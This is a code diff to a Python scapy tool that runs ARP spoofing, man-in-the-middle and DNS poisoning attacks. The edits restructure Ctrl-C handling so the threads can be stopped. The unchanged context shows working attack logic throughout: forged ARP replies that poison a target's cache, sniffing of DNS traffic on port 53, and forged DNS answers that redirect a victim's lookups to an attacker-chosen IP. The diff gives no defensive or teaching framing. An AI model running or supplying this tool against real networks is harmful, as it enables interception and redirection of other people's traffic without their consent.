@@ -72,7 +72,7 @@ def spoof(spoof_ip: str, target_ip: str, spoof_mac: str, attacker_mac: str, wait
     try:
         packet = scapy.Ether(dst=spoof_mac, type=0x0806) / scapy.ARP(op=2, pdst=spoof_ip, psrc=target_ip, hwsrc=attacker_mac)
         scapy.sendp(packet, verbose=False, inter=wait)
-    except KeyboardInterrupt: return #Ctrl + ^C interrupts the packet sending process
+    except KeyboardInterrupt: return
     except Exception as e: 
         print(f"\nThe following error was unhandled and the attack had to be stopped: \n{e}")
         return
@@ -98,7 +98,6 @@ def sniff_traffic(spoof_ip: str, ttl: int, redirect_to: str):
     print("Starting to sniff traffic on the network...")
     while not stop_flag_sniffing.is_set():
         try: scapy.sniff(promisc=True, prn = lambda packet: checkpacket(packet, spoof_ip, ttl, redirect_to), filter=f"(src host {spoof_ip} or dst host {spoof_ip}) and port 53", count=1, timeout=2, store=False)
-        except KeyboardInterrupt: stop_flag_sniffing.set()
         except Exception as e:
             print(f"\nThe following error was unhandled and the attack had to be stopped: \n{e}")
             break
@@ -148,10 +147,6 @@ def checkpacket(packet, spoof_ip: str, time_to_live: int, redirect_to_ip: str):
                 answer_packet = ether_layer / ip_layer / udp_layer / dns_layer
 
             scapy.sendp(answer_packet, verbose=False)
-            print(f"\nLast DNS query was trying to resolve: {packet[scapy.DNSQR].qname.decode()}")
-    except KeyboardInterrupt: 
-        stop_flag_sniffing.set()
-        return
     except Exception as e:
         print(f"\nThe following error was unhandled and the attack had to be stopped: \n{e}")
 
@@ -204,7 +199,18 @@ if parser == "nds":
 elif parser == "mitma":
     mitm_attack(args.targetip, args.spoofip, args.attackerip, args.targetmac, args.spoofmac, args.attackermac, args.mactimeout, args.packettimeout, args.mode, args.fixtables)
 elif parser == "dpa":
-    sniff_thread = threading.Thread(target=sniff_traffic, args=(args.spoofip, args.timetolive, args.redirectip))
-    mitm_thread = threading.Thread(target=mitm_attack, args=(args.targetip, args.spoofip, args.attackerip, args.targetmac, args.spoofmac, args.attackermac, args.mactimeout, args.packettimeout, args.mode, args.fixtables))
-    mitm_thread.start()
-    sniff_thread.start()
+    try:
+        sniff_thread = threading.Thread(target=sniff_traffic, args=(args.spoofip, args.timetolive, args.redirectip))
+        mitm_thread = threading.Thread(target=mitm_attack, args=(args.targetip, args.spoofip, args.attackerip, args.targetmac, args.spoofmac, args.attackermac, args.mactimeout, args.packettimeout, args.mode, args.fixtables))
+        sniff_thread.start()
+        mitm_thread.start()
+
+        #set a loop to stay in the main thread in case the user wants to stop the other threads
+        while sniff_thread.is_alive() or mitm_thread.is_alive():
+            time.sleep(0.2)
+    except KeyboardInterrupt:
+        stop_flag_mitm.set()
+        stop_flag_sniffing.set()
+        sniff_thread.join()
+        mitm_thread.join()
+        print("\nThe DNS Poisoning attack was stopped. Please wait for the script to end.")
